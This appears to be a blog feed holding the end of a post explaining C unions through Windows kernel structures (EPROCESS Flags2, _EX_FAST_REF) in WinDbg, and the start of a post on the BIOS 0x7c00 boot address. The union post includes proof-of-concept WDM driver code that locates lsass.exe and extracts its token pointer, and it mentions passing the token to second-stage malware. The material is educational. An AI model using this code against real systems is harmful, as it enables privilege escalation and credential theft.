            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProcessStateChangeInProgress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//0x460&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InPrivate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;//0x460&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this way, the properties of Flags2 can be set by accessing any of these fields, most of which refer to a specific bit in the 32-bit structure. Flags2 itself is 32 bits (ULONG) and can be accessed directly to get the four-byte value of all these bits. You can see this in the debugger:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt _eprocess ffffe48455c32240
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   ...
   +0x460 Flags2           : 0xd000
   +0x460 JobNotReallyActive : 0y0
   +0x460 AccountingFolded : 0y0
   +0x460 NewProcessReported : 0y0
   +0x460 ExitProcessReported : 0y0
   ...
   +0x460 ProcessStateChangeInProgress : 0y0
   +0x460 InPrivate        : 0y0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The developer has two ways to evaluate the value of Flags 2: using the four-byte dword, or by assessing each bit or bitfield individually. The kernel has the flexibility to evaluate these bit fields on their own or to evaluate the entire four-byte DWORD as a whole. Thanks to the union, there are many ways to manipulate the same data.&lt;/p&gt;

&lt;h1 id=&quot;using-trivial-bitfields&quot;&gt;Using trivial bitfields&lt;/h1&gt;

&lt;p&gt;Another approach could use some bytes for data, but leave the last N bits for other data, such as flags or properties.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AnotherUnion_u&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stackLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This union will compile to 8 bytes: enough to hold a 64-bit address plus some extra information. Note, however, that the final 3 bits of the last byte will be some value between 0 - 7.&lt;/p&gt;

&lt;p&gt;Obviously, this could be a problem in another architecture. But 64-bit stacks are 8-byte aligned. This means, the last digit in the last byte will always be 0 or 8. A developer could design their application to “mask out” the last 3 bits and get an address to the stack:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hex(0x01234567 &amp;amp; ~0xf)
&apos;0x1234560&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At the same time, you can use those last three bits to hold some information that may prove useful:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hex(0x01234567 &amp;amp; 0xf)
&apos;0x7&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this way, technically, neither field in the union is “modified.” The address is assumed to be byte-aligned in a way that ignores the flags. Those last three bits can coexist until the address is needed, in which case, the developer can just separate that information.&lt;/p&gt;

&lt;p&gt;This is exactly what happens with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EX_FAST_REF&lt;/code&gt; structure in the windows kernel:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_EX_FAST_REF&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
  &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; 
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;//0x0 &lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RefCnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//0x0 &lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;//0x0&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In WinDbg, you can see that all fields have the same offset. As observed from the sample code earlier, this indicates a union type:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt nt!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This union exists within an EPROCESS struct, which, as noted earlier, tracks the state of a given process. To further explore, we can attach WinDbg to a kernel session, open PowerShell as an administrator, and analyze that now-privileged PowerShell process:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt _eprocess ffffe48455c32240 token
ntdll!_EPROCESS
   +0x4b8 Token : _EX_FAST_REF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EX_FAST_REF&lt;/code&gt; union holds a pointer to the process’ token. Depending on the process, the token can give you elevated or administrative privileges. Processes like LSASS give you a high-enough privilege for many red-team engagements or real-world malware. Because of that, it is the topic of many writeups.&lt;/p&gt;

&lt;p&gt;Unfortunately, the pointer in the union is not correctly aligned by default:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt _ex_fast_ref ffffe48455c32240+0x4b8
ntdll!_EX_FAST_REF
   +0x000 Object           : 0xffffbb04`90d2106d Void
   +0x000 RefCnt           : 0y1101
   +0x000 Value            : 0xffffbb04`90d2106d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;em&gt;RefCnt&lt;/em&gt; bits &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1101&lt;/code&gt; will need to be dropped in order to get the token’s location:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hex ( 0xffffbb0490d2106d &amp;amp; ~0xf )
&apos;0xffffbb0490d21060&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can confirm your findings using the “easy way” in WinDbg:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; !token 0xffffbb0490d21060
_TOKEN 0xffffbb0490d21060

    // Token data dumps here...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the attacker’s point of view, it’s useful to know that the underlying data type of an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX_FAST_REF&lt;/code&gt; is a union. Knowing this, we can discard the last three bits of &lt;em&gt;RefCnt&lt;/em&gt;, because we know it’s extra data, not part of the token’s address.&lt;/p&gt;

&lt;h1 id=&quot;exploitation-example&quot;&gt;Exploitation example&lt;/h1&gt;

&lt;p&gt;We can use the following driver code for WDM to get an LSASS token. This is just proof-of-concept code, littered with manual offsets, and targeting one specific Windows version (Windows 10 2H22). It’s important to note that the Windows Driver Kit does not include many definitions, including the full EPROCESS structure, so we use offsets to get the same data “the hard way.”&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;GetLsassToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PEPROCESS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PsInitialSystemProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// EPROCESS.activeProcessLinks at offset EPROCESS+0x448&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PLIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activeProcessLinks&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PLIST_ENTRY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x448&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// EPROCESS.ImageFileName at offset EPROCESS+0x5a8&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imageFileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5a8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokenPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// KPROCESS base at EPROCESS.activeProcessLinks-0x448&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PEPROCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activeProcessLinks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x448&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PsInitialSystemProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;imageFileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5a8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;activeProcessLinks&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activeProcessLinks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_strnicmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imageFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lsass.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;KdPrintEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DPFLTR_IHVDRIVER_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DPFLTR_INFO_LEVEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;[+] Process.ImageFileName: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;imageFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_strnicmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imageFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lsass.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// EPROCESS.Token at offset EPROCESS+0x4b8&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tokenPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4b8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;KdPrintEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DPFLTR_IHVDRIVER_ID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DPFLTR_INFO_LEVEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;[+] Process.Token: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;tokenPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokenPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script loops through every process until &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsass.exe&lt;/code&gt; is found. It takes the LSASS token and returns it for further use.&lt;/p&gt;

&lt;p&gt;In this code, we access the token’s address from the EPROCESS structure’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX_FAST_REF&lt;/code&gt; field in one statement, which in many ways summarizes the debugging we did earlier:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;// EPROCESS.Token at offset EPROCESS+0x4b8&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tokenPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4b8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In a real-world campaign, you could give this token to a second-stage malware or command-and-control server for further system abuse.&lt;/p&gt;

&lt;p&gt;The big note here is that we are basically accessing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EPROCESS.Token&lt;/code&gt;. Because we have some insight into its data type (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX_FAST_REF&lt;/code&gt;), we know that the final bits could contain superfluous data. Because we have some insight into token address alignment, we also know that we can safely drop them (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp; ~0xf&lt;/code&gt;).&lt;/p&gt;</content><author><name></name></author><summary type="html">Most people who learn C after a language like Python or JavaScript are stumped at the concept of the union, a native C data type. Unions look like structures, but their behavior couldn’t be farther from it. If C is meant to abstract raw assembly, the union is a subtle reminder that you are, at all times, just one step away from writing low-level code.</summary></entry><entry><title type="html">Why does BIOS load boot code from 0x7c00?</title><link href="http://localhost:4000/2025/01/21/Why-does-BIOS-load-boot-code-from-0x7c00.html" rel="alternate" type="text/html" title="Why does BIOS load boot code from 0x7c00?" /><published>2025-01-21T00:00:00-05:00</published><updated>2025-01-21T00:00:00-05:00</updated><id>http://localhost:4000/2025/01/21/Why-does-BIOS-load-boot-code-from-0x7c00</id><content type="html" xml:base="http://localhost:4000/2025/01/21/Why-does-BIOS-load-boot-code-from-0x7c00.html">&lt;p&gt;If you research BIOS and MBR conventions, you’ll find lot of “insider knowledge” without many back-references or primary sources. This will only get worse as systems migrate to UEFI, and MBR is laid to rest with cassette tapes and CD players. For now, we can expect to live with MBR BIOS for some period of time, so there is still some merit in researching its conventions.&lt;/p&gt;

&lt;p&gt;One such convention is the loading and executing MBR code from, specifically, location 0x7c00. You’ll notice this virtual offset is accounted for, hardcoded into nearly all boot code. You won’t see this type of hardcoding in typical PE or ELF files, which define their own virtual memory address, and which may even struggle to load hardcoded locations in this way.&lt;/p&gt;

&lt;p&gt;I found this “magic number” interesting because its history is ambiguous. For such an integral part of the boot process, there’s no formal standard that states this as a requirement. In the most technical sense, BIOS code “may” boot anywhere, but most of them jump to this location in memroy. Why is that?&lt;/p&gt;

&lt;p&gt;First, let’s check out the Wikipedia page for BIOS:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The name originates from the Basic Input/Output System used in the CP/M operating system in 1975. The BIOS firmware was originally proprietary to the IBM PC; it was reverse engineered by some companies (such as Phoenix Technologies) looking to create compatible systems. &lt;em&gt;The interface of that original system serves as a de facto standard.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The bit about a “de facto standard” plays an interesting role in the history of BIOS, dating all the way to 1975. We can see that one overarching goal many of these engineers was to enable compatibility among systems.&lt;/p&gt;

&lt;p&gt;You’ll often see this in real-world software development as a way to save time (by not reinventing the wheel). It gives you a kind of working standard. You can streamline the time and effort that goes into debugging or developing code. As a low-level, 16-bit BIOS developer, it’s good to know that your boot code will always start at the same location, even if there’s no official document which defines where it “must” start.&lt;/p&gt;

&lt;p&gt;Still, if you go looking, you’re not likely to find much about the standardization of 0x7c00 in 1975. How did it become a &lt;em&gt;de facto&lt;/em&gt; one? Who started it?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.glamenv-septzen.net/en/view/6?utm_source=chatgpt.com&quot;&gt;Most&lt;/a&gt; &lt;a href=&quot;https://ukscott.blogspot.com/2016/11/why-bios-loads-mbr-into-0x7c00-in-x86.html&quot;&gt;researchers&lt;/a&gt; attribute the very first instance of this to the IBM PC 5150, “the ancestor of modern x86 (32bit) IBM PC/AT Compatible PCs,” made in 1981. This is  six years after the CP/M BIOS firmware was originally reverse engineered.&lt;/p&gt;

&lt;p&gt;You’ll notice the magic number appear in two contexts: BIOS memory maps, and calls to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INT 19H&lt;/code&gt;. I wanted to find out more, so I found the &lt;a href=&quot;https://bitsavers.org/pdf/ibm/pc/pc/6025008_PC_Technical_Reference_Aug81.pdf&quot;&gt;Technical Reference guide&lt;/a&gt; for this exact system.&lt;/p&gt;

&lt;p&gt;The guide itself is pretty old, a scan of a document that dates back to 1981. Unfortunately, this leaves the modern reader with OCR-based text rendering, which doesn’t play nicely with searching, copying, or pasting. For convenience, I’ve transcribed the &lt;a href=&quot;https://gist.github.com/halcyondream/93726fe6877a6f48ee50c417f38740a3&quot;&gt;INT 19H listing here&lt;/a&gt;. If you have questions beyond what was transcribed, you’ll need to read the manual.&lt;/p&gt;

&lt;p&gt;First, it’s worth noting that the BIOS memory map on page 3-7 (171 in the PDF) lays out a simple blueprint:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
